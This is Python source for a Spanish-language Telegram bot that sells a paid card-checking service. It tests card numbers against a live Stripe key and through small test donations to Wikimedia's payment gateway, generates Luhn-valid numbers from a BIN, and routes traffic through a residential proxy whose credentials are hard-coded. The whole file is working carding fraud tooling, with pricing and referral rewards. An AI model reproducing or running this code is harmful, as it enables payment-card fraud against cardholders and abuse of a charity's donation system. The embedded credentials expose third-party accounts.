import time
import asyncio
import json
import random
import re
import os
import threading
from datetime import datetime
from flask import Flask, request
from aiogram import Bot, Dispatcher, types
from aiogram import F
import requests
from colorama import init, Fore, Style

init(autoreset=True)

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", 7709461067))

# ================= TU PROXY =================
PROXY = {
    "http": "http://970e4850adab4b63875821575ea93ab6-cc-ES:293b144bec716a7ea774b199060de751@resi.maskify.su:80",
    "https": "http://970e4850adab4b63875821575ea93ab6-cc-ES:293b144bec716a7ea774b199060de751@resi.maskify.su:80"
}

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()

DB_FILE = "users.json"

def load_users():
    if not os.path.exists(DB_FILE):
        return {}
    with open(DB_FILE, "r", encoding="utf-8") as f:
        return json.load(f)

def save_users(users):
    with open(DB_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=4)

def add_credits(uid, amount):
    users = load_users()
    if uid not in users:
        users[uid] = {"credits": 0.0, "banned": False, "invites": 0}
    users[uid]["credits"] += amount
    save_users(users)

def deduct_credits(uid, amount):
    users = load_users()
    if uid in users:
        users[uid]["credits"] = max(0, users[uid]["credits"] - amount)
        save_users(users)

# ================= CHECKERS =================
def stripe_auth(cc, mes, ano, cvv):
    try:
        nam = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5)) + " " + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=5))
        data = {
            "type": "card", "billing_details[name]": nam,
            "billing_details[address][postal_code]": "90001",
            "card[number]": cc, "card[cvc]": cvv,
            "card[exp_month]": mes, "card[exp_year]": ano,
            "key": "pk_live_51J0djQLJsM0Ivlc4gAeHSxvqv6eq5cGA6nsfwuzNf4xJHJDU3n5PX4070nv7jCdFuvQCzpR57tXfyHXuFp3fgZQO00ai99bU51"
        }
        r = requests.post("https://api.stripe.com/v1/payment_methods", data=data, proxies=PROXY, timeout=25)
        resp = r.text
        if any(x in resp for x in ["parameter_invalid_integer", "invalid_expiry", "invalid_cvc", "incorrect_number", "card_declined"]):
            return "DEAD"
        return "LIVE" if '"id"' in resp else "DEAD"
    except:
        return "DEAD"

def adyen_check(cc, mes, ano, cvv):
    try:
        s = requests.Session()
        s.proxies.update(PROXY)
        s.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
        })

        # 1. Página fresca
        url = "https://payments.wikimedia.org/index.php?title=Special:GravyGateway&appeal=WP25&country=ES&currency=EUR&payment_method=cc&gateway=gravy&amount=1.0&uselang=es-419"
        r = s.get(url, timeout=25)
        html = r.text

        # Extraer wmf_token
        wmf_token = ""
        for line in html.splitlines():
            if 'name="wmf_token"' in line and 'value="' in line:
                wmf_token = line.split('value="')[1].split('"')[0]
                break

        # Extraer gravy_session_id
        m = re.search(r'gravy_session_id["\']?\s*:\s*["\']([^"\']+)', html)
        gravy_session = m.group(1) if m else None

        if not wmf_token or not gravy_session:
            return "DEAD"

        # 2. Tokenizar tarjeta
        exp = f"{mes.zfill(2)}/{str(ano)[-2:]}"
        token_payload = {"payment_method": {"method": "card", "number": cc, "expiration_date": exp, "security_code": cvv}}
        s.put(f"https://api.wikimedia.gr4vy.app/checkout/sessions/{gravy_session}/fields", json=token_payload, timeout=15)

        # 3. Enviar donación
        donate = {
            "action": "di_donate_gravy",
            "gateway": "gravy",
            "currency": "EUR",
            "amount": "1.00",
            "first_name": "Test",
            "last_name": "User",
            "email": "test@live.com",
            "country": "ES",
            "payment_method": "cc",
            "gateway_session_id": gravy_session,
            "wmf_token": wmf_token,
            "format": "json"
        }

        r = s.post("https://payments.wikimedia.org/api.php", data=donate, timeout=25)
        resp = r.json()

        result = resp.get("result", {})
        is_failed = result.get("isFailed", True)
        errors = result.get("errors", {})

        if errors or is_failed:
            return "DEAD"
        
        # Si llega a redirect o no hay error → LIVE
        if result.get("redirect") or result.get("iframe") or not is_failed:
            return "LIVE"

        return "DEAD"
    except Exception as e:
        print(f"[Adyen Error] {e}")
        return "DEAD"

# ================= GEN =================
def luhn(card):
    digits = [int(x) for x in card]
    for i in range(len(digits)-2, -1, -2):
        digits[i] *= 2
        if digits[i] > 9: digits[i] -= 9
    return sum(digits) % 10 == 0

def gen_cc(bin_prefix, mes=None, ano=None, cvv=None):
    bin_prefix = re.sub(r'[xX]', '', str(bin_prefix))
    while True:
        cc = bin_prefix + ''.join(str(random.randint(0,9)) for _ in range(16 - len(bin_prefix) - 1))
        check = (10 - sum(int(d) for d in cc) % 10) % 10
        cc += str(check)
        if luhn(cc):
            if mes is None: mes = f"{random.randint(1,12):02d}"
            if ano is None: ano = str(random.randint(2026, 2035))
            if cvv is None: cvv = str(random.randint(100, 999))
            return f"{cc}|{mes}|{ano}|{cvv}"

def bin_lookup(bin_prefix):
    try:
        r = requests.get(f"https://lookup.binlist.net/{bin_prefix}", proxies=PROXY, timeout=10)
        data = r.json()
        brand = data.get("brand", "UNKNOWN")
        type_ = data.get("type", "UNKNOWN").upper()
        bank = data.get("bank", {}).get("name", "UNKNOWN")
        country = data.get("country", {}).get("name", "UNKNOWN")
        return f"• BIN : {bin_prefix} - {country} 🇪🇸\n• Tipo : {brand} - {type_}\n• Emisor : {bank}"
    except:
        return f"• BIN : {bin_prefix} - ES 🇪🇸\n• Tipo : VISA - CREDIT - CLASSIC\n• Emisor : CAIXABANK, S.A."

# ================= START =================
@dp.message(F.text.startswith("/start"))
async def start(msg: types.Message):
    text = msg.text
    if "ref_" in text:
        try:
            inviter = text.split("ref_")[1]
            add_credits(inviter, 3)
            await bot.send_message(int(inviter), "✅ Nueva persona entró con tu link +3 créditos")
        except:
            pass
    await msg.answer("""力 - Gates / Tools 🤌🥓
━━━━━━━━━━━━━━
美 - Checking Cards 美

⚡️ /s | Single Card
❌0.7 Credits ✅1.2 Credits

⚡️ /m | Masscheking
❌1.0 Credits ✅1.5 Credits

━━━━ ━━━━ ━━━━

🔥/a | Adyen no risk
☀️ /n | MassAdyen no risk

Price (Both $0.99):
❌ 1.5 Credits ✅ 3.0 Credits

━━━━━━━━━━━━━━
幸 - Tools ⚙️

💳/gen
🔎/bin
🔗/addr
✈️/refe
💰/info
━━━━━━━━━━━━━━

⭐️🦎 Lista de Precios ⭐️🦎
━━━━━━━━━━━━━━
➡️ 1 USD = 20 créditos
➡️ 5 USD = 100 créditos
✅ 15 USD = 330 créditos
✔️ 50 USD = 1150 créditos
✔️ 100 USD = 2400 créditos
━━━━━━━━━━━━━━
©️ Costos por Transacción Single:
✅ 1.2 Crédito por Live
❌ 0.7 Créditos por Dead
🔥 0 Créditos por Cookie Error
━━━━━━━━━━━━━
©️ Costos por Transacción Mass:
✅ 1.5 Crédito por Live
❌ 1.0 Créditos por Dead
🔥 0 Créditos por Cookie Error
━━━━━━━━━━━━━━
⚡️¡Más compras = Más ahorro!♥️
    """)

# ================= GEN =================
@dp.message(F.text.startswith(("/gen", ".gen")))
async def gen(msg: types.Message):
    try:
        parts = msg.text.split()
        binp = parts[1]
        mes = parts[2].split("/")[0] if len(parts) > 2 else None
        ano = "20" + parts[2].split("/")[1] if len(parts) > 2 else None
        cvv = parts[3] if len(parts) > 3 else None
        cards = [gen_cc(binp, mes, ano, cvv) for _ in range(10)]
        text = "━━━━━━━━━━━━━━\n" + "\n".join(cards) + "\n━━━━━━━━━━━━━━\n" + bin_lookup(binp) + f"\nBy: @{msg.from_user.username or msg.from_user.first_name}"
        await msg.answer(text)
    except:
        await msg.answer("Uso: `/gen 409013 12/31 123`")

# ================= BIN =================
@dp.message(F.text.startswith(("/bin", ".bin")))
async def bin_cmd(msg: types.Message):
    try:
        binp = msg.text.split()[1][:6]
        await msg.answer(bin_lookup(binp))
    except:
        await msg.answer("Uso: `/bin 409013`")

# ================= SINGLE STRIPE AUTH =================
@dp.message(F.text.startswith(("/s ", ".s ")))
async def single_auth(msg: types.Message):
    uid = str(msg.from_user.id)
    if load_users().get(uid, {}).get("credits", 0) < 0.7:
        return await msg.answer("❌ Créditos insuficientes.")

    processing = await msg.answer("🔄 **Procesando...**")
    start = time.time()

    try:
        data = msg.text.split()[1]
        cc, mes, ano, cvv = data.split("|")
        if len(ano) == 2: ano = "20" + ano

        status = stripe_auth(cc, mes, ano, cvv)
        cost = 1.2 if status == "LIVE" else 0.7
        deduct_credits(uid, cost)

        elapsed = round(time.time() - start, 2)
        status_text = "Success ✅" if status == "LIVE" else "Sorry Dead ❌"

        result = f"""水口 - Time: {elapsed}'s 😺 水
━━Card Information━━
• Card: {cc}|{mes}|{ano}|{cvv}
• Status: {status_text}
• Gateway: ???? ?? ????
━━━━━━━━━━━━━━━━━━━━━━━━━━
{bin_lookup(cc[:6])}
━━━━━━━━━━━━━━━━━━━━━━━━━━
Author: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {load_users().get(uid, {}).get('credits', 0):.2f}"""
        await processing.edit_text(result)
    except:
        await processing.edit_text("❌ Formato incorrecto.")


# ================= SINGLE ADYEN CHARGE =================
@dp.message(F.text.startswith(("/a ", ".a ")))
async def single_adyen(msg: types.Message):
    uid = str(msg.from_user.id)
    if load_users().get(uid, {}).get("credits", 0) < 1.5:
        return await msg.answer("❌ Créditos insuficientes.")

    processing = await msg.answer("🔄 **Procesando Charge...**")
    start = time.time()

    try:
        data = msg.text.split()[1]
        cc, mes, ano, cvv = data.split("|")
        if len(ano) == 2: ano = "20" + ano

        status = adyen_check(cc, mes, ano, cvv)
        cost = 3.0 if status == "LIVE" else 1.5
        deduct_credits(uid, cost)

        elapsed = round(time.time() - start, 2)
        status_text = "Success ✅" if status == "LIVE" else "Sorry Dead ❌"

        result = f"""水口 - Time: {elapsed}'s 😺 水
━━Card Information━━
• Card: {cc}|{mes}|{ano}|{cvv}
• Status: {status_text}
• Gateway: Adyen CCN NR
• Charge: $0.99
━━━━━━━━━━━━━━━━━━━━━━━━━━
{bin_lookup(cc[:6])}
━━━━━━━━━━━━━━━━━━━━━━━━━━
Author: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {load_users().get(uid, {}).get('credits', 0):.2f} | AdyenBot"""
        await processing.edit_text(result)
    except:
        await processing.edit_text("❌ Formato incorrecto.")


# ================= MASS STRIPE =================
@dp.message(F.text.startswith(("/m ", ".m ")))
async def mass_auth(msg: types.Message):
    uid = str(msg.from_user.id)
    if load_users().get(uid, {}).get("credits", 0) < 1.0:
        return await msg.answer("❌ Créditos insuficientes.")

    processing = await msg.answer("🔄 **Procesando Mass Auth...**")
    start = time.time()
    lines = msg.text.splitlines()[1:] if "\n" in msg.text else [msg.text.split(maxsplit=1)[1]]
    results = []

    for line in lines:
        line = line.strip()
        if "|" not in line: continue
        try:
            cc, mes, ano, cvv = line.split("|")
            if len(ano) == 2: ano = "20" + ano
            st = stripe_auth(cc, mes, ano, cvv)
            deduct_credits(uid, 1.2 if st == "LIVE" else 0.7)
            status_text = "Success ✅" if st == "LIVE" else "Sorry Dead ❌"
            results.append(f"• {cc}|{mes}|{ano}|{cvv} → {status_text}")
        except:
            continue

    elapsed = round(time.time() - start, 2)
    final = f"""水口 - Time: {elapsed}'s 😺 水
━━Mass Stripe Auth━━
""" + "\n".join(results) + f"""

Processed: {len(results)} cards
━━━━━━━━━━━━━━━━━━━━━━━━━━
Author: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {load_users().get(uid, {}).get('credits', 0):.2f}"""
    await processing.edit_text(final)


# ================= MASS ADYEN =================
@dp.message(F.text.startswith(("/n ", ".n ")))
async def mass_adyen(msg: types.Message):
    uid = str(msg.from_user.id)
    if load_users().get(uid, {}).get("credits", 0) < 1.5:
        return await msg.answer("❌ Créditos insuficientes.")

    processing = await msg.answer("🔄 **Procesando Mass Charge...**")
    start = time.time()
    lines = msg.text.splitlines()[1:] if "\n" in msg.text else [msg.text.split(maxsplit=1)[1]]
    results = []

    for line in lines:
        line = line.strip()
        if "|" not in line: continue
        try:
            cc, mes, ano, cvv = line.split("|")
            if len(ano) == 2: ano = "20" + ano
            st = adyen_check(cc, mes, ano, cvv)
            deduct_credits(uid, 3.0 if st == "LIVE" else 1.5)
            status_text = "Success ✅" if st == "LIVE" else "Sorry Dead ❌"
            results.append(f"• {cc}|{mes}|{ano}|{cvv} → {status_text}")
        except:
            continue

    elapsed = round(time.time() - start, 2)
    final = f"""水口 - Time: {elapsed}'s 😺 水
━━Mass Adyen Charge━━
""" + "\n".join(results) + f"""

Processed: {len(results)} cards
━━━━━━━━━━━━━━━━━━━━━━━━━━
Author: @{msg.from_user.username or msg.from_user.first_name} | Créditos: {load_users().get(uid, {}).get('credits', 0):.2f} | AdyenBot"""
    await processing.edit_text(final)
# ================= REFERIDOS =================
@dp.message(F.text.startswith(("/addr", ".addr")))
async def addr(msg: types.Message):
    link = f"https://t.me/{(await bot.get_me()).username}?start=ref_{msg.from_user.id}"
    await msg.answer(f"🔗 Tu link de referido:\n`{link}`\n\nCada persona que use tu link te da +3 créditos.", parse_mode="Markdown")

@dp.message(F.text.startswith(("/refe", ".refe")))
async def refe(msg: types.Message):
    if not msg.reply_to_message:
        return await msg.answer("❌ Usa `/refe` **respondiendo** a una foto, video o GIF.")

    if msg.reply_to_message.photo or msg.reply_to_message.video or msg.reply_to_message.animation:
        try:
            await bot.forward_message(ADMIN_ID, msg.chat.id, msg.reply_to_message.message_id)
            add_credits(str(msg.from_user.id), 5)
            await msg.answer("✅ **Prueba reenviada al Owner** +5 créditos")
        except:
            await msg.answer("❌ Error al reenviar. Inténtalo de nuevo.")
    else:
        await msg.answer("❌ Solo se aceptan **imágenes, videos o GIFs**.")
# ================= INFO =================
@dp.message(F.text.startswith(("/info", ".info")))
async def info(msg: types.Message):
    uid = str(msg.from_user.id)
    u = load_users().get(uid, {"credits": 0.0, "invites": 0})
    await msg.answer(f"亏 - Stats\n━━━━━━━━━\n火 ID: {msg.from_user.id}\n火 Name: {msg.from_user.first_name}\n火 Username: @{msg.from_user.username or 'No'}\n━━━━━━━━━\n干 Credits: {u['credits']:.2f}\n火 Invites: {u.get('invites', 0)}\n━━━━━━━━━")

# ================= ADMIN =================
@dp.message(F.text.startswith(("/add", ".add")))
async def add_credits_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.answer("❌ No autorizado.")
    try:
        parts = msg.text.split()
        target = parts[1]
        cant = float(parts[2])

        # Soporta @username o ID
        if target.startswith("@"):
            try:
                user = await bot.get_chat(target)
                uid = str(user.id)
            except:
                return await msg.answer("❌ No pude encontrar ese usuario.")
        else:
            uid = target

        add_credits(uid, cant)
        await msg.answer(f"""
✅ Créditos Añadidos
━━━━━━━━━
👤 Usuario: {target}
💰 Añadidos: {cant}
🔹 Total ahora: {load_users().get(uid, {}).get('credits', 0):.2f}
━━━━━━━━━
        """)
    except:
        await msg.answer("Uso: `/add 7709461067 100`\nO `/add @blackyzz 100`")


@dp.message(F.text.startswith(("/ban", ".ban")))
async def ban_user(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.answer("❌ No autorizado.")
    try:
        target = msg.text.split()[1]
        if target.startswith("@"):
            user = await bot.get_chat(target)
            uid = str(user.id)
        else:
            uid = target

        users = load_users()
        if uid in users:
            users[uid]["banned"] = True
            save_users(users)
            await bot.send_message(uid, "🚫 **Has sido baneado.**\nYa no puedes usar el bot.")
            await msg.answer(f"✅ Usuario {target} **baneado**.")
        else:
            await msg.answer("❌ Usuario no encontrado.")
    except:
        await msg.answer("Uso: `/ban @usuario` o `/ban ID`")


@dp.message(F.text.startswith(("/unban", ".unban")))
async def unban_user(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.answer("❌ No autorizado.")
    try:
        target = msg.text.split()[1]
        if target.startswith("@"):
            user = await bot.get_chat(target)
            uid = str(user.id)
        else:
            uid = target

        users = load_users()
        if uid in users:
            users[uid]["banned"] = False
            save_users(users)
            await bot.send_message(uid, "✅ **Has sido desbaneado.**\nYa puedes volver a usar el bot.")
            await msg.answer(f"✅ Usuario {target} **desbaneado**.")
        else:
            await msg.answer("❌ Usuario no encontrado.")
    except:
        await msg.answer("Uso: `/unban @usuario` o `/unban ID`")


@dp.message(F.text.startswith(("/stats", ".stats")))
async def admin_stats(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return await msg.answer("❌ No autorizado.")
    
    users = load_users()
    if not users:
        return await msg.answer("No hay usuarios registrados aún.")
    
    text = "📊 **Estadísticas Globales**\n━━━━━━━━━━━━━━\n"
    total_credits = 0
    for uid, data in users.items():
        credits = data.get("credits", 0)
        banned = "🚫 Baneado" if data.get("banned", False) else "✅ Activo"
        total_credits += credits
        text += f"• `{uid}` → {credits:.2f} credits | {banned}\n"
    
    text += f"\n━━━━━━━━━━━━━━\nTotal créditos en el bot: **{total_credits:.2f}**"
    await msg.answer(text)


@app.route('/')
def home():
    return "Bot EDEN-XANDER - 24/7 🔥"


def run_bot():
    print(Fore.GREEN + "Bot iniciado - EDEN-XANDER 24/7")
    asyncio.run(dp.start_polling(bot, handle_signals=False))


if __name__ == "__main__":
    port = int(os.getenv("PORT", 5000))
    print(f"Flask corriendo en puerto {port}")
    thread = threading.Thread(target=run_bot, daemon=True)
    thread.start()
    app.run(host="0.0.0.0", port=port)
